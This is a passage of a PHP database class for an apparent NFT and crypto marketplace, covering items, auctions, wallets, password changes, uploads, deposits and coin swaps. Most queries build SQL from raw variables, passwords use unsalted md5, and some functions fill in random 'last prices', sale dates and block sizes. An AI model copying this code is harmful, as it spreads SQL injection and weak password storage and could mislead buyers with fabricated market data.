                                                <button type=\"submit\" name=\"conf_status\" class=\"btn btn-danger\"><a href=\"delete_trending.html?rel=$iid\" class=\"text-white\">DELETE</a></button>
                                        </td>
                                    </tr>

        		";
        	}
         //      
	      }else {
	      	
        		$_SESSION['trending_items'] .= "

                                    <tr style=\"text-align:center\">
                                       <td colspan=\"5\" >
                                           
                                            <div >
                                                NO FAILED ITEMS FOR THIS USER
                                                
                                            </div>
                                        </td>
                                    </tr>

        		";
	    	} 
}

public function delete_trending_item($iid){
	$sql2 ="DELETE FROM trending WHERE iid='$iid'";
	$result2 = mysqli_query($this->db,$sql2) or die(mysqli_connect_errno()."oData cannot be inskerted.");

	if($result2){
		return true;
	}else{
		return false;
	}
}
public function add_trending_item($iid){
	$sql2 ="INSERT INTO trending SET iid='$iid'";
	$result2 = mysqli_query($this->db,$sql2) or die(mysqli_connect_errno()."oData cannot be inskerted.");

	if($result2){
		return true;
	}else{
		return false;
	}
}
      
public function get_collections(){

		$sql = "SELECT * FROM collection";
		$result = mysqli_query($this->db,$sql);	      
		$count_row = $result->num_rows;  

      $_SESSION['collection_items'] = "";
	      if($count_row >0){
        	while($user_data = mysqli_fetch_array($result)){
        		
						$cpicture = $user_data['cpicture'];
						$cname = $user_data['ctitle'];
						$cabout = $user_data['about'];
						$cid = $user_data['cid'];

        		$_SESSION['collection_items'] .= "

                                   <div class=\"col-md-6 col-xl-3\">

                                <!-- Simple card -->
                                <div class=\"card\">
                                    <img class=\"card-img-top img-fluid\" src=\"../img/marketplace/$cpicture\" alt=\"Card image cap\">
                                    <div class=\"card-body\">
                                        <h4 class=\"card-title\">$cname</h4>
                                        <p class=\"card-text\">$cabout</p>
                                        <a href=\"view_items.html?rel=$cid\" class=\"btn btn-primary waves-effect waves-light\">View Collection</a>
                                    </div>
                                </div>
        
                            </div>

        		";
        	}
         //      
	      }
//
}


public function get_items($cid){
    
		$sql = "SELECT * FROM trending";
		$result = mysqli_query($this->db,$sql);	      
		$_SESSION['trending_count'] = $count_row = $result->num_rows;

		if($_SESSION['trending_count'] <=7){
			$button_hide = " ";
			$_SESSION['trending_alert'] = " ";
		}else{
			$button_hide = "d-none";
			$_SESSION['trending_alert'] = "
						<div class=\"col-lg-12\">
					    <div class=\"card bg-danger border-danger text-white-50\">
					        <div class=\"card-body\">
					            <h5 class=\"mb-4 text-white text-center\"><i class=\"mdi mdi-block-helper me-3\"></i>MAXIMUM TRENDING ITEMS REACHED</h5>
					            <p class=\"card-text text-center\">Remove Items from <a href=\"panel2.html\" class=\"text-white text-decoration-underline\">Trending</a> to Add Others.</p>
					        </div>
					    </div>
					</div>
			";
		}

		$sql = "SELECT * FROM items WHERE cid='$cid'";
		$result = mysqli_query($this->db,$sql);	      
		$count_row = $result->num_rows;  

      $_SESSION['item_items'] = "";
	      if($count_row >0){
	      	$counter = 0;
        	while($user_data = mysqli_fetch_array($result)){
        		
						$ipicture = $user_data['ipicture'];
						$iname = $user_data['iname'];
						$iprice = $user_data['iprice'];
						$iid = $user_data['iid'];
						$cid = $user_data['cid'];


						$sql1 = "SELECT * FROM trending WHERE iid='$iid'";
						$result1 = mysqli_query($this->db,$sql1);
						$count_row = $result1->num_rows;
						if($count_row >0){
							continue;
						}
        		$_SESSION['item_items'] .= "

                                   <div class=\"col-md-6 col-xl-3\">

                                <!-- Simple card -->
                                <div class=\"card\">
                                    <img class=\"card-img-top img-fluid\" src=\"../img/marketplace/$ipicture\" alt=\"Card image cap\">
                                    <div class=\"card-body\">
                                        <h4 class=\"card-title\">$iname</h4>
                                        <p class=\"card-text\">$iprice USD</p>
                                        <a href=\"add_trending.html?rel=$iid&cid=$cid\" class=\"btn btn-primary waves-effect waves-light $button_hide\">ADD TO TRENDING</a>
                                    </div>
                                </div>
        
                            </div>

        		";
        		$counter +=1;
        	}  
         //   

		      if($counter == 0){
		      	$_SESSION['item_items'] = "
							<div class=\"col-12\">
									<div class=\"text-center\">NO ITEMS LEFT TO ADD TO TRENDING</div>								
							</div>";
		      }   
	      }else{
		      	$_SESSION['item_items'] = "
							<div class=\"col-12\">
									<div class=\"text-center\">NO ITEMS IN THE COLLECTION</div>								
							</div>";
		      } 

//
}

public function get_minting_data(){

		$sql = "SELECT * FROM minting WHERE id='231'";
		$result = mysqli_query($this->db,$sql);	 
		$user_data = mysqli_fetch_array($result);

		$_SESSION['iname'] = $user_data['iname'];
		$_SESSION['about1'] = $user_data['about1'];
		$_SESSION['about2'] = $user_data['about2'];
		$_SESSION['about3'] = $user_data['about3'];
		$_SESSION['about4'] = $user_data['about4'];
		$_SESSION['about5'] = $user_data['about5'];
		$_SESSION['about6'] = $user_data['about6'];
		$_SESSION['about7'] = $user_data['about7'];
		$_SESSION['iprice'] = $user_data['iprice'];
		$_SESSION['bal_minted'] = $user_data['bal_minted'];
		$_SESSION['total_minted'] = $user_data['total_minted'];
		$_SESSION['crypto_symbol'] = $user_data['crypto_symbol'];

}
  public function update_minting_data($iname,	$about1,	$about2,	$about3,	$about4,	$about5,	$about6,	$about7,	$iprice,	$bal_minted,	$total_minted,	$crypto_symbol,$lprice){

  		$iname= htmlspecialchars($iname); 	$about1= htmlspecialchars($about1); 	$about2= htmlspecialchars($about2); 	$about3= htmlspecialchars($about3); 	$about4= htmlspecialchars($about4); 	$about5= htmlspecialchars($about5); 	$about6= htmlspecialchars($about6); 	$about7= htmlspecialchars($about7); 	$iprice= htmlspecialchars($iprice); 	$bal_minted= htmlspecialchars($bal_minted); 	$total_minted= htmlspecialchars($total_minted); 	$crypto_symbol= htmlspecialchars($crypto_symbol); $lprice= htmlspecialchars($lprice);   		$sql1 ="UPDATE minting SET iname='$iname',	about1='$about1',	about2='$about2',	about3='$about3',	about4='$about4',	about5='$about5',	about6='$about6',	about7='$about7',	iprice='$iprice',	bal_minted='$bal_minted',	total_minted='$total_minted',	crypto_symbol='$crypto_symbol',lprice='$lprice' WHERE  id='231'";
			$result2 = mysqli_query($this->db,$sql1);	 
              
  		if($result2){
  			return true;
  		}else{
  			return false;
  		}
  }
        

public function get_item_list(){

	$sql2 ="SELECT * FROM items";

	//checking if the username is available in the table
	$result = mysqli_query($this->db,$sql2);
	if(!$result){
	    return false;
        	 $_SESSION['item_list'] = "a";
	    
	}
	//$user_data = mysqli_fetch_array($result);item_list
        	 $_SESSION['item_list'] = "";
        	 $_SESSION['item_list'] = "
        	 	  <option selected>Select Item</option>
        	 	  ";
        while($user_data = mysqli_fetch_array($result)){
        	 $cid = $user_data['cid'];
					 $sql21 ="SELECT * FROM collection WHERE cid='$cid'";
					 $result1 = mysqli_query($this->db,$sql21);
					 $user_data1 = mysqli_fetch_array($result1);
					 $cname = $user_data1['ctitle'];
        	 $_SESSION['item_list'] .= "
			  <option value=\"".$user_data['iid']."\">".$user_data['iname']."($cname)</option>

        	 ";

        }
        	 return true;
}
      
 public function get_orders($uid){
        $sql = "SELECT * FROM likes WHERE uid='$uid' ORDER BY id DESC";
        $result = mysqli_query($this->db,$sql);
        $coll_data ="";


        while($user_data1 = mysqli_fetch_array($result)){
            
            
            
            $sql1 = "SELECT * FROM items WHERE iid='".$user_data1['iid']."'";
            $result1 = mysqli_query($this->db,$sql1);
            $user_data = mysqli_fetch_array($result1); 
            if($user_data['status'] =="sold"){
                continue;
            }
            
            
            $sql1 = "SELECT * FROM collection WHERE cid='".$user_data['cid']."'";
            $result1 = mysqli_query($this->db,$sql1);
            $data = mysqli_fetch_array($result1);  
            $coll_name =  $data['ctitle'];
            
            
                $coll_ver = $data['cverified'];
                if (strlen($coll_ver) > 4) // if you want...
                {
                    $coll_ver = "<span class=\"iconify-inline\" data-icon=\"fe:check-verified\" style=\"color: white;\"></span>";
                }else{
                    $coll_ver = "";
                }
        $coll_data .="
            		



                           <div class=\"col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12\">
                                 <div class=\"view-store-item\"><!--
                                    <span class=\"store-label alert alert-success\">Completed</span>-->
                                    <div class=\"view-store-box\">
                                       <div class=\"view-store-images\">
                                          <a href=\"#\"><img src=\"public/images/category/".$user_data['ipicture']."\" alt=\"\"></a>
                                       </div>
                                       <div class=\"view-store-info\">
                                          <h3 class=\"user-theme-title\">".$user_data['iname']."</h3><!--
                                          <p class=\"theme-description\">Lets make your own coin, Coin P</p>-->
                                          <ul>
                                             <li>Token ID : <span>".$user_data['id']."</span></li>
                                             <li>Seller : <span>".$user_data['iseller']." ".$coll_ver."</span></li>
                                          </ul>
                                          <div class=\"item-group-box clearfix\">
                                             <div class=\"item-group-bid\">
                                                <p class=\"theme-description\">Price:</p>
                                                <h2>".round($user_data['iprice']/coinvalue('ETH',1),2)."<!--<i class=\"fab fa-ethereum\"></i>--> <img src=\"public/images/eth.png\"  style=\"height: 20px; width:20px;\"></h2>
                                             </div>
                                             <div class=\"item-group-bid\">
                                               <a href=\"".$user_data['ilink']."\">  <button class=\"theme-btn\">Pay</button></a>
                                             </div>
                                             <div class=\"item-group-bid\">
                                                 <form method=\"post\"id=\"".$user_data['iid']."\">
                        <input hidden type=\"submit\" name=\"liked\" value=\"".$user_data['iid']."\">
                        <input hidden type=\"text\" name=\"cancel_order\" value=\"".$user_data['iid']."\">
                        </form>
                                                <button class=\"theme-btn transparent-btn\" id=\"".$user_data['iid']."\">Cancel Order <i class=\"fas fa-trash\"></i></button>
                                             </div>
                                          </div>
                                          <ul>
                                             <li>Store : <span>".$coll_name."</span></li>
                                             <li>Contract Address : <span><!--0x87fDD73dcA8E93e359832C7De3bab2B198bB5555-->0x87fDD73dcA8E9....</span></li>
                                            
                                          </ul>
                                       </div>
                                    </div>
                                    <!--<p class=\"theme-description browse-description\">".$user_data['about']."</p>-->
                                 </div>
                              </div>
        
        
        
        ";
            
        }
     $_SESSION['coll_data']  = $coll_data;
        return true;
 }  
        


 public function get_wallet($uid){
        
        $sql = "SELECT * FROM users WHERE uid='$uid'";
        $result = mysqli_query($this->db,$sql);
        $user_data2 = mysqli_fetch_array($result); 
            
        $sql = "SELECT * FROM wallet WHERE uid='$uid'";
        $result = mysqli_query($this->db,$sql);
        $coll_data ="";
    
            $counter =1;
        while($user_data1 = mysqli_fetch_array($result)){
            
            
            
            $sql1 = "SELECT * FROM items WHERE iid='".$user_data1['iid']."'";
            $result1 = mysqli_query($this->db,$sql1);
            $user_data = mysqli_fetch_array($result1); 
            $hideauc = "";
        if($uid=="NS571344" && $user_data['iid']=="tmtyupoosectybtfzbe"){
            $hideauc = "hidden";
        }
        if($uid=="NS571344" && $user_data['iid']=="tmtyupoosectybtfzbe"){
            $hideauc = "hidden";
        }
        if($lpriced=="not"){
            $hidelast = "hidden";
        }else{
            $hidelast = " ";
        }
        if(strlen($user_data1['atimer']) > 0){
            $hideauc = "hidden";
            $hidetimer = " ";
        }else{
            $hidetimer = "hidden";
            $hideauc = " ";
        }
        
            
            $sql1 = "SELECT * FROM collection WHERE cid='".$user_data['cid']."'";
            $result1 = mysqli_query($this->db,$sql1);
            $data = mysqli_fetch_array($result1);  
            $coll_name = $data['ctitle'];
        
                $seconds = strtotime($user_data1['atimer']) - time();

                $days = floor($seconds / 86400);
                $seconds %= 86400;

                $hours = floor($seconds / 3600);
                $seconds %= 3600;

                $minutes = floor($seconds / 60);
                $seconds %= 60;
                
                
                $str= "$days:$hours:$minutes:$seconds";
                
                $coll_data .=" 
                
                     
<script>

// Set the date we're counting down to
var countDownDate".$counter." = new Date(\"".$user_data1['atimer']."\").getTime();

// Update the count down every 1 second
var x".$counter." = setInterval(function() {

  // Get today's date and time
  var now".$counter." = new Date().getTime();

  // Find the distance between now and the count down date
  var distance".$counter." = countDownDate".$counter." - now".$counter.";

  // Time calculations for days, hours, minutes and seconds
  var days".$counter." = Math.floor(distance".$counter." / (1000 * 60 * 60 * 24));
  var hours".$counter." = Math.floor((distance".$counter." % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes".$counter." = Math.floor((distance".$counter." % (1000 * 60 * 60)) / (1000 * 60));
  var seconds".$counter." = Math.floor((distance".$counter." % (1000 * 60)) / 1000);

  // Display the result in the element with id=\"demo\"
  document.getElementById(\"basic_count".$counter."\").innerHTML =  days".$counter." +  \"d:\" +  hours".$counter." +  \"h:\" + minutes".$counter." +  \"m:\" +  seconds".$counter."  + \"s\";

  // If the count down is finished, write some text
  if (distance".$counter." < 0) {
    clearInterval(x".$counter.");
    document.getElementById(\"basic_count".$counter."\").innerHTML = \"EXPIRED\";
  }
}, 1000);
</script>
            		
<div class=\"col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12\">
                                 <div class=\"view-store-item\"><!--
                                    <span class=\"store-label alert alert-success\">Completed</span>-->
                                    <div class=\"view-store-box\">
                                       <div class=\"view-store-images\">
                                          <a href=\"#\"><img src=\"public/images/category/".$user_data['ipicture']."\" alt=\"\"></a>
                                       </div>
                                       <div class=\"view-store-info\">
                                          <h3 class=\"user-theme-title\">".$user_data['iname']."</h3>
                                          
                        <h4  style=\"font-size: 15px;\"><b>".round($user_data['iprice']/coinvalue('ETH',1),2)."</b><!--<i class=\"fab fa-ethereum\"></i>--> <img src=\"public/images/eth.png\"  style=\"height: 15px; width:15px;\"> <span ></span></h4>
                        <h4  style=\"font-size: 13px;\" $hidelast>Last Price ".round($user_data['lprice']/coinvalue('ETH',1),2)."<!--<i class=\"fab fa-ethereum  style=\"color: red;\"></i>--> <img src=\"public/images/eth2.png\"  style=\"height: 15px; width:15px;\"> <span ></span></h4>
                        
                                                <a class=\"theme-btn\"   $hideauc
                                                id=\"auctionbtn\" data-title=\"".$user_data['iid']."\"  data-itemname=\"".$user_data['iname']."\"   data-toggle=\"modal\" data-target=\"#nft-wallet\" href=\"#\" >Auction Item<i class=\"fas fa-bullhorn\"></i></a>
                                                <div class=\"nft-item-time mt-2 mb-2\">
                                                   <span class=\"card__time card__time--clock\" $hidetimer style=\"\">
                                                      Time Left for Auction: <i class=\"fas fa-clock\"></i><span id=\"basic_count".$counter."\" class=\"card__clock card__clock--2\"></span>
                                                   </span><!--
                                                   <span class=\"card__time card__time--clock\" $hidetimer style=\"\">
                                                      <i class=\"fas fa-clock\"></i><span  class=\"card__clock card__clock--2\">SOLD OUT</span>
                                                   </span>-->
                                                </div>
                                          <ul>
                                             <li class=\"\"><b>COLLECTION</b> : <span>".$coll_name."</span></li><!--<li class=\"mt-5 mb-3\"></li>-->
                                             <li  class=\" \"><b>SELLER</b> : <span>".$user_data2['fullname']."</span></li>
                                          </ul>
                                          <div class=\"item-group-box clearfix\">
                                             
                                             <div class=\"item-group-bid\">
                                                <a class=\"theme-btn\"
                                                id=\"downloadFile\"
                                               download=\"".$user_data['ipicture']."\" href=\"public/images/category/".$user_data['ipicture']."\" >Save <i class=\"fa fa-download\" aria-hidden=\"true\"></i></a>
                                               
                                             </div>
                                             <div class=\"item-group-bid\">
                                                 <form method=\"post\" id=\"fdfdfdfdrup9wibjj9h\">
                        <input  hidden=\"\" type=\"submit\" name=\"liked\" value=\"fdfdfdfdrup9wibjj9h\">
                        <input hidden=\"\" type=\"text\" name=\"cancel_order\" value=\"fdfdfdfdrup9wibjj9h\">
                        </form>
                                                
                                             </div>
                                          </div>
                                          
                                       </div>
                                    </div>
                                    
                                 </div>
                              </div>
        
        ";
          
                $counter +=1;  
        }
     $_SESSION['coll_data']  = $coll_data;
        return true;
 }          
    
        
    public function like_unlike($iid,$uid){
                
		$sql = "SELECT * FROM likes WHERE uid='$uid' AND  iid='$iid'";
		$result = mysqli_query($this->db,$sql);
        
		$count_row = $result->num_rows;
        if($count_row !=0){
            
            $sql2 ="DELETE FROM likes WHERE uid='$uid' AND iid='$iid'";
            $result2 = mysqli_query($this->db,$sql2) or die(mysqli_connect_errno()."oData cannot be inskerted.");
            
    		if($result2){
    			return true;
    		}else{
    			return false;
    		}
        }else{

            $sql2 ="INSERT INTO likes SET uid='$uid', iid='$iid'";
            $result2 = mysqli_query($this->db,$sql2) or die(mysqli_connect_errno()."oData cannot be inskerted.");
                
    		if($result2){
    			return true;
    		}else{
    			return false;
    		}
        }
    }  
        
/*		$sql4 = "SELECT * FROM wallet WHERE iid='$itemid' AND uid='$uid'";
                if ($user_data['atimer']=="sold") // if you want...
                {
                    $status = "display:none;";
                    $statustwo =  "display:relative;";
                     $statusthree = "";
                }else{
                    
                    $statustwo = "display:none;";
                    $status =  "display:relative;";
                     $statusthree = "";
                }*/
    public function auctionitem($itemid,$uid){
            
            $NewDate=Date('M d, Y H:i:s', strtotime('+3 days'));
    		$sql1 ="UPDATE wallet SET atimer='$NewDate' WHERE  iid='$itemid' AND uid='$uid'";
            $result2 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."oData cannot be inskerted.");
                
    		if($result2){
    			return true;
    		}else{
    			return false;
    		}
    }
	public function change_password($pass,$act, $uid){
		$sql = "SELECT * FROM users WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql);
		$user_data = mysqli_fetch_array($result);
		$dbac = $user_data['activationcode'];
		if($dbac == $act){
    		$pass = md5($pass);
    		$sql1 ="UPDATE users SET upass='$pass' WHERE  activationcode='$act'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
    		$sql1 ="UPDATE users SET  activationcode='0000' WHERE upass='$pass'";
    		$result = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
    		if($result1){
    			return true;
    		}else{
    			return false;
    		}
		}else{
    			return false;
    		}
	}
        //change password from the profile
	public function change_password2($pass,$conpass,$uid){
        //$oldpass = md5($oldpass);
        if($pass == $conpass){
    		$pass = md5($pass);
    		$sql1 ="UPDATE users SET upass='$pass' WHERE  uid='$uid'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
    		if($result1){
    			return true;
    		}
		}else{
    		return false;
        }
	}
        //change name from the profile
	public function change_name($display_name,$uid){
		$sql = "SELECT * FROM users WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql);
		$user_data = mysqli_fetch_array($result);
    		$sql1 ="UPDATE users SET fullname='$display_name' WHERE  uid='$uid'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
    		if($result1){
    		    $_SESSION['fullname'] =$display_name;
    			return true;
    		}else{
    			return false;
            }
	}
	
	
	
	//change password from the profile
	public function change_password3($pass,$uid){
		$sql = "SELECT * FROM users WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql);
		$user_data = mysqli_fetch_array($result);
        
    		$pass = md5($pass);
    		$sql1 ="UPDATE users SET upass='$pass' WHERE  activationcode='$uid'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
    		if($result1){
    			return true;
    		}else{
    			return false;
    		}
		
	}
	
	//image upload 
	public function storeimg($file, $upload_dir){
		$img_name = $file['name'];
		$img_size = $file['size'];
		$tmp_name = $file['tmp_name'];
		$error = $file['error'];
		//error
		if($error === 0){
			if($img_size >20096000){
				$em = "Sorry Your file is too large";
			}else{
				$img_ex = pathinfo($img_name, PATHINFO_EXTENSION);//get extension
				$img_ex_lc = strtolower($img_ex);
				$allowed_exs = array("jpg","jpeg","png");
				
				if(in_array($img_ex_lc, $allowed_exs)){
					$new_img_name = uniqid("IMG-",true).'.'.$img_ex_lc;
					$img_upload_path = $upload_dir.'/'.$new_img_name;
					move_uploaded_file($tmp_name, $img_upload_path);
					//insert into data base
					
				}else{
					$em = "You can't upload files of this type";
					return false;
				}
			}
		}//end of error
		else{
			$em = "Unknown Error has occurred";
		}
		return $new_img_name;
	}
	//Item Image upload 
	public function storecollimg($file){
		$img_name = $file['name'];
		$img_size = $file['size'];
		$tmp_name = $file['tmp_name'];
		$error = $file['error'];
		//error
		if($error === 0){
			if($img_size >20096000){
				$em = "Sorry Your file is too large";
			}else{
				$img_ex = pathinfo($img_name, PATHINFO_EXTENSION);//get extension
				$img_ex_lc = strtolower($img_ex);
				$allowed_exs = array("jpg","jpeg","png");

			$sql2 ="SELECT * FROM items";

			//checking if the username is available in the table
			$result = mysqli_query($this->db,$sql2);
			$count_row = $result->num_rows;
				if(in_array($img_ex_lc, $allowed_exs)){
				    $count = $count_row + 1;
				    $upload_dir = "img/marketplace";
					$new_img_name = 'item-'.$count.'.jpg';//.$img_ex_lc;
					$img_upload_path = $upload_dir.'/'.$new_img_name;
					move_uploaded_file($tmp_name, $img_upload_path);
					//insert into data base
					
				}else{
					$em = "You can't upload files of this type";
					return false;
				}
			}
		}//end of error
		else{
			$em = "Unknown Error has occurred";
		}
		return $new_img_name;
	}
	//Collection Image upload 
	public function storeautimg($file){
		$img_name = $file['name'];
		$img_size = $file['size'];
		$tmp_name = $file['tmp_name'];
		$error = $file['error'];
		//error
		if($error === 0){
			if($img_size >20096000){
				$em = "Sorry Your file is too large";
			}else{
				$img_ex = pathinfo($img_name, PATHINFO_EXTENSION);//get extension
				$img_ex_lc = strtolower($img_ex);
				$allowed_exs = array("jpg","jpeg","png");

			$sql2 ="SELECT * FROM collection";

			//checking if the username is available in the table
			$result = mysqli_query($this->db,$sql2);
			$count_row = $result->num_rows;
				if(in_array($img_ex_lc, $allowed_exs)){
				    $count = $count_row + 1;
				    $upload_dir = "img/marketplace";
					$new_img_name = 'user'.$count.'.png';//.$img_ex_lc;
					$img_upload_path = $upload_dir.'/'.$new_img_name;
					move_uploaded_file($tmp_name, $img_upload_path);
					//insert into data base
					
				}else{
					$em = "You can't upload files of this type";
					return false;
				}
			}
		}//end of error
		else{
			$em = "Unknown Error has occurred";
		}
		return $new_img_name;
	}
	
        
        public function get_coll_list(){

			$sql2 ="SELECT * FROM collection";

			//checking if the username is available in the table
			$result = mysqli_query($this->db,$sql2);
			if(!$result){
			    return false;
            	 $_SESSION['coll_list'] = "a";
			    
			}
			//$user_data = mysqli_fetch_array($result);
            	 $_SESSION['coll_list'] = "";
            	 $_SESSION['coll_list'] = "
            	 	  <option selected>Select Collection</option>
            	 	  ";
            while($user_data = mysqli_fetch_array($result)){
            	 $_SESSION['coll_list'] .= "
					  <option value=\"".$user_data['cid']."\">".$user_data['ctitle']."</option>

            	 ";

            }
            	 return true;
        }
        public function rand_item_date(){

			$sql2 ="SELECT * FROM items";

			//checking if the username is available in the table
			$result = mysqli_query($this->db,$sql2);
			if(!$result){
			    return false;
			    
			}
			$user_data = mysqli_fetch_array($result);
			$count_row = $result->num_rows;
            //	 $_SESSION['coll_list'] = "$count_row";
            $a=array();

            while($user_data = mysqli_fetch_array($result)){
            	array_push($a,$user_data['id']);

            }
            
            $acount = count($a);
            $i = 0;
             while($i < $acount){
               $mon =  1;//rand(0,1);
               if($mon ==0){
                   $month = "Dec";
                   $year = "2021";
               }
               
             if($mon ==1){
                     $month = date('M');;
                     $year = "2022";
               }
                $da =  rand(1,4);
                
                           
                               
             if($da ==1){
                    
                     $day =  date("d") + 7;
                     $day =  "$day";
                     
               }                
                               
             if($da ==2){
                     $day =  date("d") + 8;
                     $day =  "$day";
               }                  
             if($da ==3){
                     $day =  date("d") + 9;
                     $day =  "$day";
               }                  
             if($da ==4){
                     $day =  date("d") + 10;
                     $day =  "$day";
               }                
                              
             if($mon ==0){
                     $day = "31";
               }
               
               $timey ="$month $day, $year ".rand(0,23).":".rand(0,59).":".rand(10,59);
               $uid = $a[$i];
                
            	    		$sql1 ="UPDATE items SET itime='$timey' WHERE  id='$uid'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
    		$i++;
   
}   
            	 return true;
        }
        
        public function set_item_status($istatus,$iid){
            	$sql1 ="UPDATE items SET status='$istatus' WHERE  iid='$iid'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
            	 return true;
        }
        public function set_coll_item_status($istatus,$cid){
            	$sql1 ="UPDATE items SET status='$istatus' WHERE  cid='$cid'";
    		$result1 = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
            	 return true;
        }
        
        //upload items
        public function upload_item($iname,$iprice,$ilink,$ipicture,$iview,$iseller,$cid){
            
    		function generateRandomString($length = 18) {
    		$characters = 'abcdefghijklmnopqrstuvwxyz';
    		$charactersLength = strlen($characters);
    		$randomString = '';
    		for ($i = 0; $i < $length; $i++) {
    			$randomString .= $characters[rand(0, $charactersLength - 1)];
    		}
    		return $randomString;
    		}
    		$iid = "t".generateRandomString(18);
    		$sql ="SELECT * FROM items WHERE iid='$iid'";
    		//checking if the tid is available in the db 
    		$check = $this->db->query($sql);
    		$count_row = $check->num_rows;
    		
            $sql1 = "SELECT * FROM collection WHERE cid='$cid'";
            $result1 = mysqli_query($this->db,$sql1);
            $data = mysqli_fetch_array($result1);  
            $iauthorpic =  $data['authorpic'];
            $iseller =  $data['author']; 
    		while($count_row > 0){
    			$iid = "t".generateRandomString(18);	
    			$sql ="SELECT * FROM transaction WHERE iid='$iid'";
    			//checking if the tid is available in the db 
    			$check = $this->db->query($sql);
    			$count_row = $check->num_rows;
    		}
    		//$iprice = round($iprice / coinvalue('ETH',1),2);
    		$lprice = round((rand(20,30)/100)*$iprice,2);
    		$sql ="INSERT INTO items SET iname='$iname',about='ii',iprice='$iprice',ilink='$ilink',ipicture='$ipicture',cid='$cid',iid='$iid',iview='$iview',gen_status='Unminted',iseller='$iseller',lprice='$lprice'";
    		$check = $this->db->query($sql);
    		if($check){
    			return true;
    		}else{
    			return false;
    		}
        }
        //upload collections
        public function upload_col($iname,$iver,$iauthor,$ipicture,$iview,$iseller,$iabout){
            
    		function generateRandomString($length = 18) {
    		$characters = 'abcdefghijklmnopqrstuvwxyz';
    		$charactersLength = strlen($characters);
    		$randomString = '';
    		for ($i = 0; $i < $length; $i++) {
    			$randomString .= $characters[rand(0, $charactersLength - 1)];
    		}
    		return $randomString;
    		}
    		$cid = "C".generateRandomString(18);
    		$sql ="SELECT * FROM collection WHERE cid='$cid'";
    		//checking if the tid is available in the db 
    		$check = $this->db->query($sql);
    		$count_row = $check->num_rows;
    		
    		while($count_row > 0){
    			$cid = "C".generateRandomString(18);	
    			$sql ="SELECT * FROM collection WHERE cid='$cid'";
    			//checking if the tid is available in the db 
    			$check = $this->db->query($sql);
    			$count_row = $check->num_rows;
    		}
    		//$iprice = round($iprice / coinvalue('ETH',1),2);
    		
    		$sql ="INSERT INTO collection SET ctitle='$iname',about='iabout',cpicture='$ipicture',cid='$cid',cverified='$iver',cviews='$iview',author='$iauthor'";
    		$check = $this->db->query($sql);
    		if($check){
    			return true;
    		}else{
    			return false;
    		}
        }
	public function deposit($pic, $uid,$plan,$coin){
		
		function generateRandomString($length = 15) {
		$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
		}
		$tid = "t".generateRandomString(15);
		$sql ="SELECT * FROM transaction WHERE tid='$tid'";
		//checking if the tid is available in the db 
		$check = $this->db->query($sql);
		$count_row = $check->num_rows;
		while($count_row > 0){
			$tid = "t".generateRandomString(15);	
			$sql ="SELECT * FROM transaction WHERE tid='$tid'";
			//checking if the tid is available in the db 
			$check = $this->db->query($sql);
			$count_row = $check->num_rows;
		}
		$blocksize = generateRandomString(6);
		$sql ="SELECT * FROM transaction WHERE blocksize='$blocksize'";
		//checking if the blocksize is available in the db 
		$check = $this->db->query($sql);
		$count_row = $check->num_rows;
		while($count_row > 0){
			$blocksize = generateRandomString(6);	
			$sql ="SELECT * FROM transaction WHERE blocksize='$blocksize'";
			//checking if the blocksize is available in the db 
			$check = $this->db->query($sql);
			$count_row = $check->num_rows;
		}
		
		$sql ="INSERT INTO transaction SET uid='$uid',tid='$tid',transaction='Deposit',amount='$pic',blocksize='$blocksize',status='PENDING',plan='$plan',coin='$coin'";
		$check = $this->db->query($sql);
		if(isset($check)){
			return true;
		}else{
			return false;
		}
	}	
	
	public function transaction($uid){
		$sql ="SELECT * FROM transaction WHERE uid='$uid' AND status='CONFIRMED'";
		$check = $this->db->query($sql);
		if(isset($check)){
			//$userdata = mysqli_fetch_array($check);
			return $check;
		}
	}
	public function swap($base, $quote,  $bvalue, $qvalue, $uid){
		$sql1 ="SELECT * FROM wallet WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql1);
		$userdata = mysqli_fetch_array($result);
		if($userdata){
			
			if($base == "BTC"){
				if($quote == "ETH"){
					if($userdata['btc_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['eth_bal'];
						$new_bal = $userdata['btc_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET eth_bal='$qvalue', btc_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "LTC"){
					if($userdata['btc_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['ltc_bal'];
						$new_bal = $userdata['btc_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET ltc_bal='$qvalue', btc_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "DOGE"){
					if($userdata['btc_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['dog_bal'];
						$new_bal = $userdata['btc_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET dog_bal='$qvalue', btc_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				
			}
			if($base == "ETH"){
				if($quote == "BTC"){
					if($userdata['eth_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['btc_bal'];
						$new_bal = $userdata['eth_bal'] - $bvalue;
